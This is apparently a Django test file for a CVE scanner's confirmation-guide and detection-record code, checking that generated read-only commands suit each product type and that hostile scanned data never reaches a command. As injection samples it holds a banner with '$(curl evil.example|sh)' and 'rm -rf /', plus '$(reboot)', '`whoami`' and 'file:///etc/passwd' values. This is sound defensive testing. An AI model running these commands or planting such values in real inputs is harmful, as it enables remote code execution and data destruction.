"""Confirm it yourself: the per-match guide (cveFeed.confirm_guide) and the class-aware per-CVE record (cveFeed.detection).

The guide for one match names the real script URL, page, host and port, says what to look for, gives read-only steps with those values in
them (never <TARGET> or <PORT>), how to read the answer, what makes it exploitable beyond the version, and the fix. Text a scanned host or a
feed supplied is shown as quoted data and never reaches a command. The per-CVE record checks each product the way that fits it: no nmap and
no dpkg, rpm or apk for a JavaScript library's packagings or a language package."""
import gzip
import json
import os
import re
import shlex
import tempfile
from unittest import mock

from django.contrib.auth.models import User
from django.test import SimpleTestCase, TestCase
from django.utils import timezone

from cveFeed import confirm_guide, detection, detection_author, seed
from cveFeed.models import CVEDetection, CVEEntry, CVEMatch, ProbeObservation, RouteAuth
from dashboard.models import Org, Project
from scanEngine.models import EngineType
from startScan.models import CveId, IpAddress, Port, ScanHistory, Subdomain, Vulnerability
from targetApp.models import Domain

# CVE-2020-11023 as the feed gives it (cvelistV5 and OSV merged, with the OSV ecosystems)
JQUERY = [
	{'vendor': 'jquery', 'product': 'jQuery', 'ranges': [{'introduced': '1.0.3', 'fixed': '3.5.0'}]},
	{'ecosystem': 'npm', 'package': 'jquery', 'ranges': [{'introduced': '1.0.3', 'fixed': '3.5.0'}]},
	{'ecosystem': 'RubyGems', 'package': 'jquery-rails', 'ranges': [{'introduced': '0', 'fixed': '4.4.0'}]},
	{'ecosystem': 'NuGet', 'package': 'jQuery', 'ranges': [{'introduced': '1.0.3', 'fixed': '3.5.0'}]},
	{'ecosystem': 'Maven', 'package': 'org.webjars.npm:jquery', 'ranges': [{'introduced': '1.0.3', 'fixed': '3.5.0'}]},
	{'ecosystem': 'Packagist', 'package': 'components/jquery', 'ranges': [{'introduced': '1.0.3', 'fixed': '3.5.0'}]},
]
JQUERY_TEXT = ("In jQuery versions greater than or equal to 1.0.3 and before 3.5.0, passing HTML containing <option> elements from untrusted "
			   "sources - even after sanitizing it - to one of jQuery's DOM manipulation methods (i.e. .html(), .append(), and others) may execute "
			   "untrusted code. This problem is patched in jQuery 3.5.0.")
# CVE-2021-41184: jQuery UI under its npm, Maven, NuGet and RubyGems names, and a Bitnami image of Drupal
JQUERY_UI = [
	{'vendor': 'jquery', 'product': 'jquery-ui', 'ranges': [{'fixed': '1.13.0'}]},
	{'ecosystem': 'Bitnami', 'package': 'drupal', 'ranges': [{'introduced': '7.0.0', 'fixed': '7.86.0'}]},
	{'ecosystem': 'npm', 'package': 'jquery-ui', 'ranges': [{'introduced': '0', 'fixed': '1.13.0'}]},
	{'ecosystem': 'Maven', 'package': 'org.webjars.npm:jquery-ui', 'ranges': [{'introduced': '0', 'fixed': '1.13.0'}]},
	{'ecosystem': 'NuGet', 'package': 'jQuery.UI.Combined', 'ranges': [{'introduced': '0', 'fixed': '1.13.0'}]},
	{'ecosystem': 'RubyGems', 'package': 'jquery-ui-rails', 'ranges': [{'introduced': '0', 'fixed': '7.0.0'}]},
]
# CVE-2024-6409 as the rules saw it: the upstream name with Red Hat's build, Red Hat releases, and an OpenShift container image
OPENSSH_RHEL = [
	{'package': 'OpenSSH', 'ranges': [{'fixed': '0:8.7p1-38.el9_4.4'}]},
	{'vendor': 'Red Hat', 'product': 'Red Hat Enterprise Linux 9', 'package': 'openssh', 'ranges': [{'fixed': '0:8.7p1-38.el9_4.4'}]},
	{'vendor': 'Red Hat', 'product': 'Red Hat OpenShift Container Platform 4.13', 'package': 'openshift/ose-rhel-coreos-9',
	 'ranges': [{'fixed': '413.92.202408122222-0'}]},
]
OS_PACKAGERS = re.compile(r'\b(dpkg|dpkg-query|rpm|apk)\b')


def record(cve_id, affected, title='t', text='', vector='CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H'):
	cve = CVEEntry(cve_id=cve_id, title=title, affected=affected, original_description=text, cvss_vector=vector)
	return detection.finalize(detection.rules_strategy(cve, []), vector)


class ClassAwareRecordTests(SimpleTestCase):
	def test_a_javascript_library_record_has_no_nmap_and_no_os_package_check_of_a_packaging(self):
		strategy = record('CVE-2020-11023', JQUERY, text=JQUERY_TEXT)
		self.assertEqual([c['kind'] for c in strategy['remote_checks']], ['script_version'])
		self.assertNotIn('nmap', json.dumps(strategy).lower())
		for check in strategy['local_checks']:
			for command in check.get('commands', []):
				if OS_PACKAGERS.search(command['command']):
					# only a real distribution package of the library: Debian libjs-jquery / node-jquery, Fedora js-jquery
					self.assertIn(check['params']['package'], ('libjs-jquery', 'node-jquery', 'js-jquery'), command['command'])
		for packaging in ('components/jquery', 'org.webjars.npm:jquery', 'jquery-rails'):
			commands = [cmd['command'] for c in strategy['local_checks'] if c['params'].get('package') == packaging for cmd in c['commands']]
			self.assertTrue(commands, packaging)
			self.assertFalse(any(OS_PACKAGERS.search(cmd) for cmd in commands), packaging)
			self.assertTrue(all(cmd['platform'] == 'app' for c in strategy['local_checks'] if c['params'].get('package') == packaging
								for cmd in c['commands']))

	def test_the_jquery_ecosystems_are_one_component_with_every_coordinate(self):
		strategy = record('CVE-2020-11023', JQUERY, text=JQUERY_TEXT)
		self.assertEqual(len(strategy['components']), 1)
		comp = strategy['components'][0]
		self.assertEqual((comp['name'], comp['class'], comp['library']), ('jQuery', 'client_library', 'jquery'))
		self.assertEqual({(c['ecosystem'], c['package']) for c in comp['coordinates']},
						 {('npm', 'jquery'), ('gem', 'jquery-rails'), ('nuget', 'jQuery'), ('maven', 'org.webjars.npm:jquery'),
						  ('composer', 'components/jquery')})
		ui = record('CVE-2021-41184', JQUERY_UI)
		library = [c for c in ui['components'] if c['class'] == 'client_library']
		self.assertEqual(len(library), 1)
		self.assertIn(('nuget', 'jQuery.UI.Combined'), {(c['ecosystem'], c['package']) for c in library[0]['coordinates']})
		self.assertEqual([c['kind'] for c in ui['remote_checks']], ['script_version'])  # no banner for the NuGet name, none for Bitnami
		self.assertEqual({c['params']['package']: c['params']['affected_below'] for c in ui['local_checks']
						  if c['params'].get('ecosystem') == 'gem'}, {'jquery-ui-rails': '7.0.0'})  # each packaging's own fix

	def test_the_library_guidance_has_no_backport_or_services_tab_language_and_names_the_console_check(self):
		strategy = record('CVE-2020-11023', JQUERY, text=JQUERY_TEXT)
		words = ' '.join(strategy['confirm_steps'] + strategy['false_positive_signs'] + strategy['true_positive_signs'])
		self.assertNotIn('backport', words.lower())
		self.assertNotIn('Services tab', words)
		self.assertIn('jQuery.fn.jquery', words)
		self.assertIn('no longer loads that copy', words)
		self.assertIn('untrusted sources', strategy['exploit_precondition'])

	def test_a_language_package_is_checked_in_the_dependency_tree_never_by_nmap_or_an_os_package_manager(self):
		strategy = record('CVE-2099-501', [{'ecosystem': 'PyPI', 'package': 'django', 'ranges': [{'introduced': '4.2', 'fixed': '4.2.16'}]}])
		self.assertEqual(strategy['components'][0]['class'], 'language_package')
		self.assertEqual(strategy['remote_checks'][0]['params']['source'], 'technology')
		self.assertNotIn('nmap', strategy['remote_checks'][0]['how']['invocation'])
		commands = [cmd['command'] for c in strategy['local_checks'] for cmd in c['commands']]
		self.assertIn('python3 -m pip show django', commands)
		self.assertFalse(any(OS_PACKAGERS.search(cmd) for cmd in commands))
		self.assertNotIn('backport', json.dumps(strategy['false_positive_signs']).lower())
		self.assertNotIn('nmap', strategy['validation']['recommended_tools'])

	def test_an_os_package_is_checked_with_its_own_distribution_only_and_a_release_or_image_is_never_a_banner(self):
		strategy = record('CVE-2024-6409', OPENSSH_RHEL)
		self.assertEqual(strategy['remote_checks'], [])  # a RHEL build number is no version a banner states
		packages = {(c['params']['ecosystem'], c['params']['package']) for c in strategy['local_checks']}
		self.assertEqual(packages, {('rpm', 'openssh-server')})
		commands = [cmd['command'] for c in strategy['local_checks'] for cmd in c['commands']]
		self.assertTrue(all(cmd.startswith('rpm -q') for cmd in commands), commands)
		self.assertNotIn('ose-rhel-coreos', json.dumps(strategy['local_checks']))
		self.assertNotIn('Red Hat Enterprise Linux 9', json.dumps(strategy['remote_checks']))
		self.assertIn('Red Hat Enterprise Linux 9', strategy['identify'])

	def test_a_cms_extension_named_like_a_library_is_not_read_as_the_library(self):
		strategy = record('CVE-2026-114538', [{'vendor': 'Drupal', 'product': 'Bootstrap', 'ranges': [{'introduced': '0.0.0', 'fixed': '3.45.0'}]}],
						  title='Bootstrap - Moderately critical - Cross-site scripting - SA-CONTRIB-2026-236')
		self.assertEqual(strategy['components'][0]['class'], 'cms_component')
		self.assertEqual([c['kind'] for c in strategy['remote_checks']], ['version_banner'])
		self.assertEqual(strategy['remote_checks'][0]['how']['tool'], 'technology fingerprint')
		self.assertIn('not a JavaScript library', strategy['identify'])

	def test_a_web_server_banner_is_read_from_its_header(self):
		strategy = record('CVE-2099-502', [{'vendor': 'F5', 'product': 'NGINX Open Source', 'ranges': [{'introduced': '0.5.13', 'fixed': '1.28.3'}]}])
		check = strategy['remote_checks'][0]
		self.assertEqual((check['params']['source'], check['how']['tool']), ('http_header', 'curl'))
		self.assertIn('Server header', check['how']['decide'])

	def test_an_older_records_os_package_check_of_a_language_coordinate_is_never_rendered_as_dpkg(self):
		from cveFeed.detection_commands import render_local
		for package in ('components/jquery', 'org.webjars.npm:jquery', '@angular/core', 'openshift/ose-rhel-coreos-9'):
			commands = render_local({'kind': 'package_version', 'params': {'ecosystem': 'any', 'package': package, 'affected_below': '3.5.0'}})
			self.assertFalse(any(OS_PACKAGERS.search(c['command']) for c in commands), package)
		self.assertEqual([c['command'] for c in render_local({'kind': 'package_version', 'params': {'ecosystem': 'any',
						 'package': 'org.webjars.npm:jquery', 'affected_below': '3.5.0'}})][0], 'mvn -q dependency:tree -Dincludes=org.webjars.npm:jquery')

	def test_the_schema_takes_components_and_refuses_bad_ones(self):
		strategy, problems = detection.validate_strategy({'identify': 'x', 'components': [
			{'name': 'jQuery', 'class': 'client_library', 'library': 'jquery', 'coordinates': [{'ecosystem': 'npm', 'package': 'jquery'},
																						   {'ecosystem': 'npm', 'package': '$(reboot)'}]},
			{'name': 'x', 'class': 'shell'}, 'nope']})
		self.assertEqual(strategy['components'], [{'name': 'jQuery', 'class': 'client_library', 'library': 'jquery',
												   'coordinates': [{'ecosystem': 'npm', 'package': 'jquery'}]}])
		self.assertEqual(len(problems), 2)

	def test_the_ai_prompt_carries_the_class_rules(self):
		for words in ('FIT THE CHECKS TO THE KIND OF PRODUCT', 'never dpkg, rpm, apk', 'composer components/jquery', 'exploit_precondition'):
			self.assertIn(words, detection_author.SYSTEM_PROMPT)


class Site:
	"""One project, one domain, one scan; hosts with one address each. Anonymised: example.com and 192.0.2.0/24."""

	def __init__(self):
		now = timezone.now()
		self.user = User.objects.create_superuser('guide-admin', 'g@example.com', 'x')
		org = Org.objects.create(name='o', slug='o')
		self.project = Project.objects.create(name='p', slug='guide', insert_date=now, org=org)
		self.domain = Domain.objects.create(name='example.com', project=self.project, insert_date=now)
		engine = EngineType.objects.create(engine_name='e', yaml_configuration='')
		self.scan = ScanHistory.objects.create(domain=self.domain, scan_type=engine, scan_status=2, start_scan_date=now)

	def host(self, name, ip, ports=()):
		sub = Subdomain.objects.create(name=name, target_domain=self.domain, scan_history=self.scan, http_url=f'https://{name}')
		address = IpAddress.objects.create(address=ip)
		sub.ip_addresses.add(address)
		for port in ports:
			address.ports.add(port)
		return sub

	def cve(self, cve_id, affected, text=''):
		cve = CVEEntry.objects.create(cve_id=cve_id, title=f'{cve_id} title', affected=affected, original_description=text,
									  published_at=timezone.now(), cvss=6.5)
		with mock.patch.object(detection, 'installed_template_ids', return_value=[]):
			detection_author.author_rules()
		return cve

	def detail(self, match):
		from agentapi.services import Ctx, finding_detail
		return finding_detail(Ctx(self.user), self.project.slug, 'match', match.pk)


SCRIPT = 'https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js'
PLACEHOLDERS = re.compile(r'<(TARGET|PORT|HOST|URL)>')


def all_commands(guide):
	out = [s['command'] for s in guide.get('steps', []) if s.get('command')]
	out += [c['command'] for section in guide.get('local', []) for c in section['commands']]
	if guide.get('template', {}).get('command'):
		out.append(guide['template']['command'])
	return out


class MatchGuideTests(TestCase):
	def setUp(self):
		self.site = Site()

	def reset(self):
		for model in (CVEMatch, CVEEntry, Subdomain, RouteAuth, IpAddress):
			model.objects.all().delete()

	def jquery_match(self, script=SCRIPT, extra_copies=()):
		cve = self.site.cve('CVE-2020-11023', JQUERY, JQUERY_TEXT)
		sub = self.site.host('blog.example.com', '192.0.2.10')
		copies = [{'url': script, 'order': 34, 'state': 'effective', 'source': 'body', 'version': '2.1.3'}, *extra_copies]
		RouteAuth.objects.create(project=self.site.project, domain=self.site.domain, host='blog.example.com', url='https://blog.example.com/',
								 path='/', auth_state='open', http_status=200,
								 evidence={'libraries': {'jquery': {'product': 'jQuery', 'version': '2.1.3', 'copies': copies}}})
		return CVEMatch.objects.create(cve_entry=cve, subdomain=sub, source='tech', matched_product='jQuery', matched_version='2.1.3',
									   version_in_range=True, confidence=0.95,
									   evidence={'range': {'fixed': '3.5.0', 'introduced': '1.0.3'}, 'copies': copies, 'source': 'tech',
												 'copy_state': 'effective', 'script_url': script, 'raw_version': '2.1.3', 'version_source': 'body'})

	def test_a_javascript_library_guide_links_the_script_and_page_and_fills_in_the_real_values(self):
		match = self.jquery_match(extra_copies=[{'url': 'https://blog.example.com/js/jquery-1.12.4.min.js', 'order': 3, 'state': 'shadowed',
												 'source': 'body', 'version': '1.12.4'}])
		detail = self.site.detail(match)
		guide = detail['confirm']
		self.assertEqual(guide['class'], 'client_library')
		urls = [w.get('url') for w in guide['where']]
		self.assertEqual(urls[:2], [SCRIPT, 'https://blog.example.com/'])
		self.assertIn('https://blog.example.com/js/jquery-1.12.4.min.js', urls)  # every copy the page loads
		self.assertIn('/*! jQuery v2.1.3', guide['look_for'][0]['text'])
		steps = {s['run_in']: s for s in guide['steps']}
		self.assertEqual(steps['browser']['url'], SCRIPT)
		self.assertEqual(steps['browser_console']['command'], 'jQuery.fn.jquery')
		self.assertIn(f'curl -sS --max-time 20 {SCRIPT}', steps['shell']['command'])
		self.assertEqual(guide['verdict']['fixed'], '3.5.0')
		self.assertIn('untrusted sources', guide['precondition']['quote'])
		self.assertIn('<option>', guide['precondition']['needs'])
		commands = all_commands(guide)
		self.assertTrue(any(c.startswith('npm ls jquery') for c in commands))
		self.assertTrue(any('composer show components/jquery' == c for c in commands))
		self.assertTrue(any('jquery-rails' in c for c in commands))
		self.assertFalse(any(OS_PACKAGERS.search(c) or 'nmap' in c for c in commands), commands)
		self.assertFalse(any(PLACEHOLDERS.search(c) for c in commands))
		self.assertIn('change the version in the script URL', guide['fix'])

	def test_the_curated_self_test_is_offered_only_for_its_cve_and_says_it_runs_in_your_own_browser(self):
		match = self.jquery_match()
		self.assertFalse([s for s in self.site.detail(match)['confirm']['steps'] if 'self-test' in s['title']])  # none curated for 11023
		cve = CVEEntry.objects.create(cve_id='CVE-2020-11022', title='t', affected=JQUERY, published_at=timezone.now())
		match.cve_entry = cve
		guide = confirm_guide.match_guide(match)
		test = next(s for s in guide['steps'] if 'self-test' in s['title'])
		self.assertIn('jQuery.htmlPrefilter("<div/><span/>")', test['command'])
		self.assertIn('changes nothing on the server', test['detail'])
		self.assertEqual(test['run_in'], 'browser_console')

	def test_a_web_server_guide_names_the_header_and_the_host_package(self):
		cve = self.site.cve('CVE-2099-503', [{'vendor': 'F5', 'product': 'NGINX Open Source', 'ranges': [{'introduced': '0.5.13', 'fixed': '1.28.3'}]}])
		sub = self.site.host('www.example.com', '192.0.2.11')
		ProbeObservation.objects.create(project=self.site.project, domain=self.site.domain, host='www.example.com', probe='headers-root',
										kind='version', product='nginx', version='1.18.0', port=443, url='/', source='header:server', confidence=0.9)
		match = CVEMatch.objects.create(cve_entry=cve, subdomain=sub, source='tech', matched_product='NGINX Open Source', matched_version='1.18.0',
										version_in_range=True, evidence={'range': {'fixed': '1.28.3', 'introduced': '0.5.13'}, 'source': 'tech'})
		guide = self.site.detail(match)['confirm']
		self.assertEqual(guide['class'], 'web_server')
		self.assertEqual(guide['look_for'][0]['text'], 'Server: nginx/1.18.0')
		self.assertIn("curl -sS -I --max-time 15 https://www.example.com/ | grep -i -e '^Server:'", all_commands(guide))
		self.assertIn('nginx -v', all_commands(guide))
		self.assertTrue(any("dpkg-query" in c and ' nginx' in c for c in all_commands(guide)))
		self.assertIn('backport', guide['verdict']['not_affected'])
		self.assertFalse(any(PLACEHOLDERS.search(c) for c in all_commands(guide)))

	def test_a_network_service_guide_uses_the_real_address_and_port_and_quotes_a_hostile_banner(self):
		cve = self.site.cve('CVE-2024-6387', [{'package': 'OpenSSH', 'ranges': [{'introduced': '8.5p1', 'lastAffected': '9.7p1'}]}])
		port = Port.objects.create(number=2222, service_name='ssh', product='OpenSSH', version='8.9p1 Ubuntu 3ubuntu0.10')
		sub = self.site.host('ssh.example.com', '192.0.2.12', [port])
		hostile = 'Ubuntu Linux; protocol 2.0 `id` $(curl evil.example|sh)\nrm -rf / ; \'"'
		match = CVEMatch.objects.create(cve_entry=cve, subdomain=sub, source='port', matched_product='OpenSSH',
										matched_version='8.9p1 Ubuntu 3ubuntu0.10 $(reboot)', version_in_range=True,
										evidence={'source': 'port', 'ip': '192.0.2.12', 'port': 2222, 'protocol': 'tcp', 'service_extra': hostile,
												  'raw_version': '8.9p1 `whoami`', 'range': {'introduced': '8.5p1', 'lastAffected': '9.7p1'}})
		guide = self.site.detail(match)['confirm']
		self.assertEqual(guide['class'], 'network_service')
		commands = all_commands(guide)
		self.assertIn('nmap -Pn -sV --version-intensity 5 -p 2222 192.0.2.12', commands)
		self.assertEqual(guide['fill'], {'TARGET': 'ssh.example.com', 'PORT': '2222'})  # the general steps' placeholders, on this page
		self.assertIn('nc -w 5 192.0.2.12 2222 </dev/null | head -n 1', commands)
		self.assertTrue(any("openssh-server" in c and c.startswith('dpkg-query') for c in commands))
		for command in commands:
			for bad in ('`', '$(', 'evil', 'reboot', 'whoami', 'rm -rf'):
				self.assertNotIn(bad, command)
			self.assertNotIn('\n', command)
			self.assertFalse(PLACEHOLDERS.search(command))
		quotes = ' '.join(x.get('quote', '') for x in guide['look_for'])
		self.assertIn('$(curl evil.example|sh)', quotes)  # shown as the data it is
		self.assertTrue(any('Ubuntu' in link['label'] for link in guide['links']))
		self.assertIn('Ubuntu', ' '.join(guide['verdict'].get('notes', [])))

	def test_a_hostile_script_url_never_becomes_a_link_or_a_command(self):
		for bad in ("https://cdn.example.com/x.js';reboot;'", 'https://cdn.example.com/$(reboot).js', 'javascript:alert(1)', 'https://cdn.example.com/x.js\n$(id)', 'file:///etc/passwd',
					'https://u:p@cdn.example.com/x.js', 'https://cdn.example.com/`id`.js'):
			self.reset()
			guide = confirm_guide.match_guide(self.jquery_match(script=bad))
			blob = json.dumps(guide)
			self.assertNotIn('reboot', blob, bad)
			self.assertNotIn('$(id)', blob, bad)
			self.assertNotIn('javascript:', blob, bad)
			self.assertNotIn('`id`', blob, bad)
			self.assertNotIn('u:p@', blob, bad)
		# a URL with shell-special characters that are legal and needed (& ? #) is one shell word
		self.reset()
		odd = 'https://cdn.example.com/jquery.min.js?a=1&b=2'
		guide = confirm_guide.match_guide(self.jquery_match(script=odd))
		shell = next(s['command'] for s in guide['steps'] if s['run_in'] == 'shell')
		self.assertEqual(shlex.split(shell)[4], odd)

	def test_a_wordpress_plugin_guide_reads_the_readme_stable_tag(self):
		cve = self.site.cve('CVE-2099-504', [{'vendor': 'Example', 'product': 'Example Forms', 'package': 'example-forms', 'ranges': [{'fixed': '2.4.1'}]}],
							'The Example Forms plugin for WordPress is vulnerable to stored XSS when the attacker has contributor access.')
		sub = self.site.host('news.example.com', '192.0.2.13')
		match = CVEMatch.objects.create(cve_entry=cve, subdomain=sub, source='wp-plugin', matched_product='Example Forms', matched_version='2.3.0',
										version_in_range=True, evidence={'source': 'wpscan', 'plugin': 'example-forms', 'kind': 'wp-plugin',
																		 'range': {'fixed': '2.4.1'}})
		guide = self.site.detail(match)['confirm']
		readme = 'https://news.example.com/wp-content/plugins/example-forms/readme.txt'
		self.assertEqual(guide['where'][0]['url'], readme)
		self.assertEqual(guide['look_for'][0]['text'], 'Stable tag: 2.3.0')
		self.assertTrue(any(c.startswith(f'curl -sS --max-time 15 {readme} | grep') for c in all_commands(guide)))
		self.assertIn('wp plugin get example-forms --fields=name,status,version', all_commands(guide))
		self.assertIn('contributor access', guide['precondition']['quote'])

	def test_a_tls_guide_runs_only_the_test_that_fired_on_the_real_host_and_port(self):
		cve = CVEEntry.objects.create(cve_id='CVE-2011-1473', title='t', affected=[], published_at=timezone.now())
		sub = self.site.host('vpn.example.com', '192.0.2.14')
		match = CVEMatch.objects.create(cve_entry=cve, subdomain=sub, source='testssl', matched_product='TLS service on port 8443',
										version_in_range=True, template_result='vulnerable', template_id='testssl:secure_client_renego',
										evidence={'source': 'testssl.sh', 'test': 'secure_client_renego', 'port': 8443,
												  'result': 'VULNERABLE (NOT ok) $(id)'})
		guide = self.site.detail(match)['confirm']
		self.assertEqual(guide['class'], 'tls')
		self.assertIn('testssl.sh --renegotiation vpn.example.com:8443', all_commands(guide))
		self.assertIn('openssl s_client -connect vpn.example.com:8443 -servername vpn.example.com -tls1_2', all_commands(guide))
		self.assertNotIn('template', guide)  # a testssl result is not a nuclei template
		self.assertEqual(guide['look_for'][1]['quote'], 'VULNERABLE (NOT ok) $(id)')
		self.assertFalse(any('$(id)' in c for c in all_commands(guide)))

	def test_a_template_confirmed_match_names_the_template_its_request_and_what_matched(self):
		cve = self.site.cve('CVE-2099-505', [{'vendor': 'Acme', 'product': 'Acme Portal', 'ranges': [{'fixed': '2.0'}]}])
		sub = self.site.host('portal.example.com', '192.0.2.15')
		match = CVEMatch.objects.create(cve_entry=cve, subdomain=sub, source='tech', matched_product='Acme Portal', matched_version='1.0',
										version_in_range=True, template_result='vulnerable', template_id='CVE-2099-505', evidence={'range': {'fixed': '2.0'}})
		vuln = Vulnerability.objects.create(subdomain=sub, target_domain=self.site.domain, scan_history=self.site.scan, name='x', severity=3,
											template_id='CVE-2099-505', matcher_name='status-and-body', http_url='https://portal.example.com/api/info',
											request='GET /api/info HTTP/1.1\nHost: portal.example.com', extracted_results=['1.0'], source='nuclei-cve')
		vuln.cve_ids.add(CveId.objects.create(name='CVE-2099-505'))
		guide = self.site.detail(match)['confirm']
		template = guide['template']
		self.assertEqual(template['template_id'], 'CVE-2099-505')
		self.assertEqual(template['command'], 'nuclei -duc -id CVE-2099-505 -u https://portal.example.com')
		self.assertEqual(template['matched_at'], 'https://portal.example.com/api/info')
		self.assertEqual(template['matcher'], 'status-and-body')
		self.assertIn('GET /api/info', template['request'])
		self.assertTrue(template.get('template_url') or template.get('template_search_url') or template.get('generated'))

	def test_the_guide_never_fails_the_finding_and_is_in_the_report(self):
		match = self.jquery_match()
		with mock.patch.object(confirm_guide, 'match_guide', side_effect=RuntimeError('boom')):
			self.assertIsNone(self.site.detail(match)['confirm'])
		from cveFeed.report_data import _match_entry
		match = CVEMatch.objects.select_related('cve_entry', 'subdomain').get(pk=match.pk)
		match.sev = 2
		entry = _match_entry(match, 'smoke')
		self.assertIn(SCRIPT, ' '.join(entry['confirm']['where']))
		self.assertTrue(any(s['command'].startswith('curl -sS') for s in entry['confirm']['steps']))
		self.assertIn('3.5.0', entry['confirm']['not_affected'])


def old_rules_record():
	"""The record the rules wrote for CVE-2020-11023 under schema 1: an nmap banner and dpkg/rpm/apk checks for every packaging."""
	strategy, _ = detection.validate_strategy({
		'summary': 'Potential XSS vulnerability in jQuery',
		'remote_checks': [{'id': 'version-components-jquery', 'kind': 'version_banner', 'confidence': 'medium', 'description': 'd',
						   'params': {'product': 'components/jquery', 'ranges': [{'fixed': '3.5.0'}], 'source': 'any'}}],
		'local_checks': [{'id': 'package-components-jquery', 'kind': 'package_version', 'confidence': 'high', 'description': 'd',
						  'params': {'ecosystem': 'any', 'package': 'components/jquery', 'affected_below': '3.5.0'}}],
		'confirm_steps': ['If it is a Linux package, check the distribution security tracker: a backported fix keeps the old version number.']})
	return detection.finalize(strategy)


class RegenerationTests(TestCase):
	def cve(self, cve_id):
		return CVEEntry.objects.create(cve_id=cve_id, title='Potential XSS vulnerability in jQuery', affected=JQUERY, original_description=JQUERY_TEXT,
									   published_at=timezone.now())

	def test_old_rules_records_are_regenerated_once_and_ai_and_manual_ones_never(self):
		rules = CVEDetection.objects.create(cve_entry=self.cve('CVE-2020-11023'), source='rules', schema_version=1, strategy=old_rules_record())
		ai = CVEDetection.objects.create(cve_entry=self.cve('CVE-2099-601'), source='ai', ai_model='m:x', schema_version=1, strategy=old_rules_record())
		manual = CVEDetection.objects.create(cve_entry=self.cve('CVE-2099-602'), source='manual', schema_version=1, strategy=old_rules_record())
		with mock.patch.object(detection, 'installed_template_ids', return_value=[]):
			self.assertEqual(detection_author.regenerate_rules_records(), 1)
			self.assertEqual(detection_author.regenerate_rules_records(), 0)  # idempotent: the schema version is the cursor
		rules.refresh_from_db()
		self.assertEqual(rules.schema_version, detection.SCHEMA_VERSION)
		blob = json.dumps(rules.strategy)
		self.assertNotIn('nmap', blob.lower())
		self.assertNotIn('backported fix keeps', blob)
		self.assertIn('Rules revised', rules.strategy['revision_note'])
		self.assertEqual(rules.strategy['components'][0]['library'], 'jquery')
		for row in (ai, manual):
			before = row.strategy
			row.refresh_from_db()
			self.assertEqual((row.strategy, row.schema_version), (before, 1))

	def test_the_management_command_and_the_periodic_task_regenerate(self):
		from django.core.management import call_command
		CVEDetection.objects.create(cve_entry=self.cve('CVE-2020-11023'), source='rules', schema_version=2, strategy=old_rules_record())
		with mock.patch.object(detection, 'installed_template_ids', return_value=[]):
			call_command('author_cve_detections', stdout=open(os.devnull, 'w'))
		self.assertEqual(CVEDetection.objects.get().schema_version, detection.SCHEMA_VERSION)
		CVEDetection.objects.update(schema_version=3)
		with mock.patch.object(detection, 'installed_template_ids', return_value=[]):
			self.assertEqual(detection_author.author_pending(None)['regenerated'], 1)

	def test_the_api_renders_an_old_record_with_the_current_renderer(self):
		from agentapi.services import _detection
		cve = self.cve('CVE-2020-11023')
		CVEDetection.objects.create(cve_entry=cve, source='ai', ai_model='m:x', schema_version=1, strategy=old_rules_record())
		cve = CVEEntry.objects.select_related('detection').get(pk=cve.pk)
		strategy = _detection(cve)['strategy']
		commands = [cmd['command'] for c in strategy['local_checks'] for cmd in c.get('commands', [])]
		self.assertFalse(any(OS_PACKAGERS.search(c) for c in commands), commands)  # components/jquery is never a dpkg package


class SeedTests(TestCase):
	def test_the_seed_round_trips_the_components_and_keeps_an_old_records_schema(self):
		cve = CVEEntry.objects.create(cve_id='CVE-2020-11023', title='t', affected=JQUERY, original_description=JQUERY_TEXT, published_at=timezone.now())
		with mock.patch.object(detection, 'installed_template_ids', return_value=[]):
			detection_author.author_rules()
		written = CVEDetection.objects.get(cve_entry=cve).strategy
		old = CVEEntry.objects.create(cve_id='CVE-2099-700', title='t', affected=JQUERY, published_at=timezone.now())
		CVEDetection.objects.create(cve_entry=old, source='rules', schema_version=2, strategy=old_rules_record())
		with tempfile.TemporaryDirectory() as directory:
			path = os.path.join(directory, 'seed.jsonl.gz')
			seed.export_seed(path)
			with gzip.open(path, 'rt') as handle:
				lines = [json.loads(line) for line in handle][1:]
			self.assertEqual({line['cve_id']: line['detection']['schema_version'] for line in lines}, {'CVE-2020-11023': detection.SCHEMA_VERSION,
																									  'CVE-2099-700': 2})
			CVEEntry.objects.all().delete()
			counts = seed.import_seed(path)
		self.assertEqual(counts['detections'], 2)
		back = CVEDetection.objects.get(cve_entry__cve_id='CVE-2020-11023')
		self.assertEqual(back.strategy['components'], written['components'])
		self.assertEqual(back.strategy['exploit_precondition'], written['exploit_precondition'])
		self.assertEqual(back.schema_version, detection.SCHEMA_VERSION)
		stale = CVEDetection.objects.get(cve_entry__cve_id='CVE-2099-700')
		self.assertEqual(stale.schema_version, 2)  # an old record keeps its schema, so the regeneration picks it up
		with mock.patch.object(detection, 'installed_template_ids', return_value=[]):
			self.assertEqual(detection_author.regenerate_rules_records(), 1)
